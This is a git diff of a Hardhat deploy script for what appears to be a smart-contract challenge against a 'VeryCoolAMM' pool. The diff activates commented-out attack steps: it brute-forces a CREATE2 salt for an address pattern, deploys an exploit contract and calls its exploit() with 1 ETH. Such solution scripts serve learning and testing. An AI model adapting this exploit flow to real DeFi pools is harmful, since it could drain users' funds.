@@ -5,6 +5,7 @@ import { deploy, DeploymentFlags } from "./utils/deployment";
 import { ethers } from "hardhat";
 
 import { findSaltToMatch, PatternFlags } from "./utils/findAddress";
+import { BigNumber } from "ethers";
 /**
  * Deploy SimpleContract
  */
@@ -42,22 +43,19 @@ async function main() {
 
     const signer = (await ethers.getSigners())[0];
 
-    console.log(VeryCoolAMMExploitBytecode.toString());
-    //console.log(Array.from(Buffer.from(signer.address.slice(2), "hex")).toString());
-    console.log(signer.address);
-    /*const [salt, address] = findSaltToMatch(
+    const [salt, address] = findSaltToMatch(
         signer.address,
         VeryCoolAMMExploitBytecode,
         "00000000",
         "0x0000000000000000000000000000000000000000000000000000000210573b07",
         //"0x01559739",
         PatternFlags.FromStart,
-    );*/
+    );
 
-    //console.log(`Salt: ${salt}, Address:${address}`);
+    console.log(`Salt: ${salt}, Address:${address}`);
 
     // Hack Step 3: Deploy Exploit using Salt
-    /*const VeryCoolAMMExploit: VeryCoolAMMExploit = (await deploy(
+    const VeryCoolAMMExploit: VeryCoolAMMExploit = (await deploy(
         "VeryCoolAMMExploit",
         [],
         DeploymentFlags.Deploy,
@@ -66,21 +64,8 @@ async function main() {
     console.log(`VeryCoolAMMExploit deployed at ${VeryCoolAMMExploit.address}`);
 
     // Hack Step 4: Profit!
-    const valueETH = ethers.utils.parseEther("1");
-    await VeryCoolAMMExploit.exploit(VeryCoolPeryphery.address, VeryCoolPoolETHAddress, { value: valueETH });
-*/
-    // Get latest block timestamp
-    /*const provider = await hre.ethers.getDefaultProvider();
-    const latestBlock = await provider.getBlock("latest");
-
-    // Hack Step 2: Add to ETH pool with wrong encoded data
-    const paramsETH = await VeryCoolPoolTokens.getEncodedData(
-        latestBlock.timestamp + 100,
-        "0xd91567591ec859cbb2f8bc03803bfc7d",
-    );
-    const valueETH = ethers.utils.parseEther("1");
-    await VeryCoolPeryphery.deposit([VeryCoolPoolETH], [paramsETH], [valueETH], { value: valueETH });
-    */
+    const valueETH: BigNumber = ethers.utils.parseEther("1");
+    await VeryCoolAMMExploit.exploit(VeryCoolPeryphery.address, VeryCoolPoolETHAddress, 2, { value: valueETH });
 }
 
 main()
